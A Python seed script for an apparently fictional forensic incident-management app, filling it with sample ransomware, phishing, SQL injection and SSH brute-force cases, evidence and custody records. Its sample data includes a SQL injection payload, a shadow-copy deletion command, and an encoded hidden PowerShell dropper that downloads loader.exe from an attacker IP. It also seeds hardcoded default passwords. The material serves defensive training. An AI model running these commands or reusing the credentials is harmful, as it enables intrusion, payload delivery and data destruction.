import os
from datetime import datetime, timezone, timedelta
from sqlalchemy.orm import Session
from app.config import settings
from app.models.user import User
from app.models.incident import Incident
from app.models.attack_detail import AttackDetail
from app.models.evidence import Evidence
from app.models.chain_of_custody import ChainOfCustody
from app.models.log_analysis import LogAnalysis
from app.models.security_alert import SecurityAlert
from app.security.auth import get_password_hash
from app.services.hash_service import calculate_file_sha256
from app.services.log_parser_service import parse_log_content

SAMPLE_LOG_AUTH = """Nov 16 02:14:22 bastion-01 sshd[14221]: Failed password for invalid user admin from 185.220.101.5 port 42112 ssh2
Nov 16 02:14:25 bastion-01 sshd[14224]: Failed password for invalid user root from 185.220.101.5 port 42118 ssh2
Nov 16 02:14:28 bastion-01 sshd[14229]: Failed password for invalid user test from 185.220.101.5 port 42124 ssh2
Nov 16 02:14:31 bastion-01 sshd[14233]: Failed password for invalid user postgres from 185.220.101.5 port 42130 ssh2
Nov 16 02:14:34 bastion-01 sshd[14238]: Failed password for invalid user oracle from 185.220.101.5 port 42136 ssh2
Nov 16 02:14:37 bastion-01 sshd[14242]: Failed password for user anant from 185.220.101.5 port 42142 ssh2
Nov 16 02:14:40 bastion-01 sshd[14245]: Failed password for user anant from 185.220.101.5 port 42148 ssh2
Nov 16 02:15:02 bastion-01 sshd[14250]: Accepted publickey for backup_agent from 10.0.1.25 port 39212 ssh2
Nov 16 02:18:10 bastion-01 sshd[14280]: Failed password for invalid user guest from 198.51.100.77 port 51102 ssh2
Nov 16 02:18:12 bastion-01 sshd[14282]: Failed password for invalid user support from 198.51.100.77 port 51104 ssh2
"""

SAMPLE_LOG_WEB = """185.220.101.5 - - [16/Nov/2026:03:12:01 +0000] "GET /login.php HTTP/1.1" 200 4520 "-" "Mozilla/5.0"
185.220.101.5 - - [16/Nov/2026:03:12:05 +0000] "POST /api/v1/auth HTTP/1.1" 401 210 "-" "python-requests/2.28.1"
185.220.101.5 - - [16/Nov/2026:03:12:08 +0000] "POST /api/v1/auth HTTP/1.1" 401 210 "-" "python-requests/2.28.1"
185.220.101.5 - - [16/Nov/2026:03:12:12 +0000] "POST /api/v1/auth HTTP/1.1" 401 210 "-" "python-requests/2.28.1"
203.0.113.89 - - [16/Nov/2026:03:15:30 +0000] "GET /products.php?id=1%20UNION%20SELECT%20username,password_hash%20FROM%20users HTTP/1.1" 500 890 "-" "sqlmap/1.7.2#stable"
203.0.113.89 - - [16/Nov/2026:03:16:02 +0000] "GET /admin/shell.php HTTP/1.1" 404 182 "-" "Nikto/2.1.6"
203.0.113.89 - - [16/Nov/2026:03:16:05 +0000] "GET /.env HTTP/1.1" 404 182 "-" "Nikto/2.1.6"
10.0.0.15 - - [16/Nov/2026:03:20:00 +0000] "GET /dashboard HTTP/1.1" 200 12040 "-" "Mozilla/5.0 Chrome/120.0"
"""

def seed_sample_data(db: Session):
    """
    Populates sample records for an enterprise-grade forensic presentation.
    """
    os.makedirs(settings.UPLOAD_DIR, exist_ok=True)
    os.makedirs(settings.SAMPLE_DATA_DIR, exist_ok=True)

    # Save sample log files to sample_data/ for easy user upload
    sample_auth_path = os.path.join(settings.SAMPLE_DATA_DIR, "auth_bruteforce_sample.log")
    with open(sample_auth_path, "w", encoding="utf-8") as f:
        f.write(SAMPLE_LOG_AUTH)

    sample_web_path = os.path.join(settings.SAMPLE_DATA_DIR, "webserver_exploit_sample.log")
    with open(sample_web_path, "w", encoding="utf-8") as f:
        f.write(SAMPLE_LOG_WEB)

    # 1. Create Default Users if not present
    admin_user = db.query(User).filter(User.username == "admin").first()
    if not admin_user:
        admin_user = User(
            username="admin",
            email="admin@cyberdefense.org",
            hashed_password=get_password_hash("Admin@1234"),
            full_name="Sarah Connor (SOC Director)",
            role="admin",
            department="Cyber Threat Operations",
            badge_number="SOC-DIR-001"
        )
        db.add(admin_user)

    investigator_user = db.query(User).filter(User.username == "investigator").first()
    if not investigator_user:
        investigator_user = User(
            username="investigator",
            email="investigator@cyberdefense.org",
            hashed_password=get_password_hash("Investigator@1234"),
            full_name="Alex Mercer (Lead Forensics)",
            role="investigator",
            department="Digital Forensics & Incident Response",
            badge_number="DFIR-INV-042"
        )
        db.add(investigator_user)

    db.commit()
    db.refresh(admin_user)
    db.refresh(investigator_user)

    # Check if incidents exist
    if db.query(Incident).count() > 0:
        return # Data already seeded

    now = datetime.now(timezone.utc)

    # 2. Seed Realistic Incidents
    inc1 = Incident(
        case_id="CIR-2026-0001",
        title="BlackCat / ALPHV Ransomware Infiltration on Financial DB",
        description=(
            "An intrusion was detected on Finance-DB-Cluster-01 where secondary database volumes "
            "were rapidly encrypted with .locked extension. Local shadow copies were purged via vssadmin. "
            "Attacker dropped a ransom note demanding 15 BTC."
        ),
        category="Ransomware",
        severity="Critical",
        status="Under Investigation",
        incident_datetime=now - timedelta(hours=36),
        affected_system="Finance-DB-Cluster-01 (10.0.4.12)",
        source_ip="185.220.101.44",
        destination_ip="10.0.4.12",
        assigned_investigator_id=investigator_user.id,
        created_by_id=admin_user.id,
        created_at=now - timedelta(hours=36)
    )

    inc2 = Incident(
        case_id="CIR-2026-0002",
        title="Executive Spearphishing & Microsoft 365 Token Theft",
        description=(
            "Targeted phishing campaign sent deceptive DocuSign notifications to CFO executive assistants. "
            "Stolen session tokens were utilized from a Tor exit node to access corporate financial filings."
        ),
        category="Phishing",
        severity="High",
        status="Under Investigation",
        incident_datetime=now - timedelta(days=3),
        affected_system="Mail-Exchange-O365 / Entra ID",
        source_ip="198.51.100.89",
        destination_ip="10.0.1.5",
        assigned_investigator_id=investigator_user.id,
        created_by_id=investigator_user.id,
        created_at=now - timedelta(days=3)
    )

    inc3 = Incident(
        case_id="CIR-2026-0003",
        title="SQL Injection & Customer PII Data Breach Attempt",
        description=(
            "Automated sqlmap and Nikto scanner traffic targeted the e-commerce checkout API endpoint. "
            "Over 1,200 malicious queries with UNION SELECT syntax were intercepted and logged."
        ),
        category="Unauthorized Access",
        severity="Critical",
        status="Open",
        incident_datetime=now - timedelta(days=1),
        affected_system="Core-Gateway-Proxy (10.0.0.8)",
        source_ip="203.0.113.89",
        destination_ip="10.0.0.8",
        assigned_investigator_id=investigator_user.id,
        created_by_id=admin_user.id,
        created_at=now - timedelta(days=1)
    )

    inc4 = Incident(
        case_id="CIR-2026-0004",
        title="Distributed SSH Brute Force against Bastion Gateway",
        description=(
            "Over 4,500 repeated failed SSH authentication attempts observed within 15 minutes. "
            "Originating IPs were automatically blocked at the external perimeter firewall."
        ),
        category="Brute Force",
        severity="Medium",
        status="Resolved",
        incident_datetime=now - timedelta(days=6),
        affected_system="Bastion-Gateway-02 (10.0.1.20)",
        source_ip="185.220.101.5",
        destination_ip="10.0.1.20",
        assigned_investigator_id=admin_user.id,
        created_by_id=admin_user.id,
        created_at=now - timedelta(days=6)
    )

    db.add_all([inc1, inc2, inc3, inc4])
    db.commit()
    for inc in [inc1, inc2, inc3, inc4]:
        db.refresh(inc)

    # 3. Attack Details for Incident 1 & 3
    atk1 = AttackDetail(
        incident_id=inc1.id,
        attack_type="Ransomware / BlackCat ALPHV",
        attack_source="External APT Actor (ALPHV Affiliate)",
        attack_vector="Exposed Remote Desktop (RDP) via compromised VPN credentials",
        target_system="Finance-DB-Cluster-01 (10.0.4.12)",
        source_ip="185.220.101.44",
        destination_ip="10.0.4.12",
        attack_timestamp=now - timedelta(hours=36),
        indicators_of_compromise=[
            "185.220.101.44",
            "c2.alphv-decryptor-onion.top",
            "9f83c12ab64e9a38f4d927c3e108f921a81bc7e2d93e1b7f9a8c2d1e0a82b4c5",
            "vssadmin.exe delete shadows /all /quiet"
        ],
        mitre_tactics="Initial Access (T1078), Defense Evasion (T1070), Impact (T1486)",
        suspicious_activity_description="Bulk file renaming with .locked extension and deletion of Windows Volume Shadow copies.",
        investigator_observations="Lateral movement occurred across SMB port 445 after RDP intrusion."
    )

    atk2 = AttackDetail(
        incident_id=inc3.id,
        attack_type="SQL Injection (SQLi) & Data Exfiltration",
        attack_source="External Scanner Host",
        attack_vector="Vulnerable HTTP GET parameter (?id=) in /products.php",
        target_system="Core-Gateway-Proxy (10.0.0.8)",
        source_ip="203.0.113.89",
        destination_ip="10.0.0.8",
        attack_timestamp=now - timedelta(days=1),
        indicators_of_compromise=[
            "203.0.113.89",
            "sqlmap/1.7.2#stable",
            "UNION SELECT username,password_hash FROM users"
        ],
        mitre_tactics="Initial Access (T1190), Discovery (T1595.002)",
        suspicious_activity_description="Automated injection payload delivery requesting database metadata and schema tables.",
        investigator_observations="Database returned HTTP 500 error preventing clean table extraction. WAF rules deployed."
    )
    db.add_all([atk1, atk2])
    db.commit()

    # 4. Create Physical Evidence Files on Disk and calculate real SHA-256
    ev_file_1_path = os.path.join(settings.UPLOAD_DIR, "alphv_ransom_note.txt")
    with open(ev_file_1_path, "w", encoding="utf-8") as f:
        f.write("--- BLACKCAT RANSOMWARE NOTIFICATION ---\n"
                "Your critical corporate financial databases have been encrypted using AES-256 and RSA-4096.\n"
                "Do not rename encrypted files or attempt recovery without our private master key.\n"
                "Unique Victim ID: ALPHV-CORP-9921\n"
                "Contact: hxxps://alphv-leak-portal-2026.onion/session\n")

    ev_file_2_path = os.path.join(settings.UPLOAD_DIR, "malicious_dropper_script.ps1")
    with open(ev_file_2_path, "w", encoding="utf-8") as f:
        f.write("# Suspicious Dropper Script Captured from Incident 1\n"
                "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden "
                "-EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA0ADQALwBsAG8AYQBkAGUAcgAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAbABvAGEAZABlAHIALgBlAHgAZQAiAA==\n")

    ev_file_3_path = os.path.join(settings.UPLOAD_DIR, "phishing_email_headers.eml")
    with open(ev_file_3_path, "w", encoding="utf-8") as f:
        f.write("Received: from mail-relay.phish-gate.com (198.51.100.89)\n"
                "Subject: URGENT: Q4 Executive Compensation Audit - Action Required\n"
                "From: DocuSign Secure Delivery <alerts@docusign-verification-portal.com>\n"
                "To: cfo-office@victim-corp.com\n"
                "Date: Fri, 13 Nov 2026 10:14:22 +0000\n"
                "Content-Type: text/html\n"
                "<a href='hxxps://docusign-verification-portal.com/login?token=9821'>Review Secure Document</a>\n")

    hash1 = calculate_file_sha256(ev_file_1_path)
    hash2 = calculate_file_sha256(ev_file_2_path)
    hash3 = calculate_file_sha256(ev_file_3_path)

    ev1 = Evidence(
        evidence_id="EVD-2026-0001",
        incident_id=inc1.id,
        original_filename="alphv_ransom_note.txt",
        stored_filename="alphv_ransom_note.txt",
        file_type="TXT",
        file_size=os.path.getsize(ev_file_1_path),
        storage_path=ev_file_1_path,
        original_sha256=hash1,
        current_sha256=hash1,
        integrity_status="VERIFIED",
        last_verified_at=now - timedelta(hours=30),
        uploaded_by_id=investigator_user.id,
        description="Physical ransom note recovered from root directory of encrypted Finance-DB-Cluster-01 volume.",
        created_at=now - timedelta(hours=30)
    )

    ev2 = Evidence(
        evidence_id="EVD-2026-0002",
        incident_id=inc1.id,
        original_filename="malicious_dropper_script.ps1",
        stored_filename="malicious_dropper_script.ps1",
        file_type="TXT",
        file_size=os.path.getsize(ev_file_2_path),
        storage_path=ev_file_2_path,
        original_sha256=hash2,
        current_sha256=hash2,
        integrity_status="VERIFIED",
        last_verified_at=now - timedelta(hours=28),
        uploaded_by_id=investigator_user.id,
        description="Base64-encoded PowerShell script isolated from Windows Task Scheduler (persistence mechanism).",
        created_at=now - timedelta(hours=28)
    )

    ev3 = Evidence(
        evidence_id="EVD-2026-0003",
        incident_id=inc2.id,
        original_filename="phishing_email_headers.eml",
        stored_filename="phishing_email_headers.eml",
        file_type="TXT",
        file_size=os.path.getsize(ev_file_3_path),
        storage_path=ev_file_3_path,
        original_sha256=hash3,
        current_sha256=hash3,
        integrity_status="VERIFIED",
        last_verified_at=now - timedelta(days=2),
        uploaded_by_id=investigator_user.id,
        description="Raw RFC-822 email headers and message body recovered from executive mail inbox.",
        created_at=now - timedelta(days=2)
    )

    db.add_all([ev1, ev2, ev3])
    db.commit()
    for ev in [ev1, ev2, ev3]:
        db.refresh(ev)

    # 5. Seed Chain of Custody Records
    coc1 = ChainOfCustody(
        record_id="COC-2026-0001",
        evidence_id=ev1.id,
        incident_id=inc1.id,
        action="Evidence Collected",
        previous_custodian="Finance-DB Server Disk",
        new_custodian="Alex Mercer (Lead Forensics)",
        performed_by_id=investigator_user.id,
        remarks="Extracted during initial forensic imaging of compromised server volume C:\\",
        timestamp=now - timedelta(hours=31)
    )
    coc2 = ChainOfCustody(
        record_id="COC-2026-0002",
        evidence_id=ev1.id,
        incident_id=inc1.id,
        action="Evidence Uploaded",
        previous_custodian="Alex Mercer (Lead Forensics)",
        new_custodian="CIREMS Evidence Vault",
        performed_by_id=investigator_user.id,
        remarks=f"Cryptographic SHA-256 calculated & registered: {hash1}",
        timestamp=now - timedelta(hours=30)
    )
    coc3 = ChainOfCustody(
        record_id="COC-2026-0003",
        evidence_id=ev1.id,
        incident_id=inc1.id,
        action="Integrity Verification (VERIFIED)",
        previous_custodian="CIREMS Evidence Vault",
        new_custodian="CIREMS Evidence Vault",
        performed_by_id=investigator_user.id,
        remarks="Routine daily integrity audit executed. File cryptographic hash strictly verified.",
        timestamp=now - timedelta(hours=6)
    )

    coc4 = ChainOfCustody(
        record_id="COC-2026-0004",
        evidence_id=ev2.id,
        incident_id=inc1.id,
        action="Evidence Uploaded",
        previous_custodian="Investigator Local Workspace",
        new_custodian="CIREMS Evidence Vault",
        performed_by_id=investigator_user.id,
        remarks=f"PowerShell persistence artifact ingested. SHA-256 computed: {hash2}",
        timestamp=now - timedelta(hours=28)
    )

    db.add_all([coc1, coc2, coc3, coc4])
    db.commit()

    # 6. Seed Sample Log Analysis
    parsed_auth = parse_log_content(SAMPLE_LOG_AUTH, log_type="Authentication")
    log_an = LogAnalysis(
        incident_id=inc4.id,
        log_name="bastion_auth_audit.log",
        log_type="Authentication",
        total_entries=parsed_auth["total_entries"],
        failed_logins=parsed_auth["failed_logins"],
        suspicious_ips=parsed_auth["suspicious_ips"],
        detected_patterns=[
            {
                "category": "Credential Access",
                "severity": "High",
                "title": "Repeated Authentication Failure Spike (Brute Force Anomaly)",
                "confidence": 0.95,
                "mitre_id": "T1110.001",
                "why_suspicious": "Multiple failed SSH password attempts against standard accounts (admin, root, postgres).",
                "recommended_action": "Block source IP 185.220.101.5 on perimeter firewall rules."
            }
        ],
        summary_stats=parsed_auth["summary_stats"],
        raw_preview=parsed_auth["raw_preview"],
        analysis_findings=parsed_auth["findings_summary"],
        analyzed_by_id=investigator_user.id,
        created_at=now - timedelta(days=5)
    )
    db.add(log_an)

    # 7. Seed Sample Security Alert
    alert1 = SecurityAlert(
        incident_id=inc1.id,
        evidence_id=ev2.id,
        alert_type="Malicious IOC Detected",
        severity="Critical",
        title="CRITICAL MALWARE IOC: Obfuscated Base64 PowerShell Dropper",
        description="Digital evidence item EVD-2026-0002 contains encoded remote payload download strings matching BlackCat loader signatures.",
        is_resolved=False,
        created_at=now - timedelta(hours=27)
    )
    db.add(alert1)
    db.commit()
